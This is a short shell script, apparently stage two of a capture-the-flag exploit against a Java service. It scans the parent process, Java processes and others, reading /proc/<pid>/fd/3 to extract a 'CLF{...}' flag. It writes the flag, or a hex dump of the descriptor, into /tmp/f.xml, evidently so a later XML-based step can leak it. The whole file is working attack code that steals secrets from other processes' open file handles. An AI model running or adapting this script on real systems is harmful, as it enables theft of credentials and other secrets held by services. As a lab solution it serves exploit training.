#!/bin/sh
# Stage 2: read flag from Java process fd/3
# Child process doesn't inherit fd/3 (CLOEXEC), so read from parent/java PID
for pid in $PPID $(pgrep java 2>/dev/null) 1 $(ls /proc/*/fd/3 2>/dev/null | grep -oE '[0-9]+' | head -5); do
  f=$(cat /proc/$pid/fd/3 2>/dev/null | tr -d '\000' | grep -oE 'CLF\{[^}]*\}' | head -1)
  if [ -n "$f" ]; then
    printf '<f>%s</f>\n' "$f" > /tmp/f.xml
    exit 0
  fi
done
# Fallback: hex dump from likely PIDs
for pid in $PPID $(pgrep java 2>/dev/null) 1; do
  h=$(od -A n -t x1 -N 8192 /proc/$pid/fd/3 2>/dev/null | tr -d ' \n')
  if [ -n "$h" ]; then
    printf '<f>%s</f>\n' "$h" > /tmp/f.xml
    exit 0
  fi
done
printf '<f>no_fd3_found</f>\n' > /tmp/f.xml
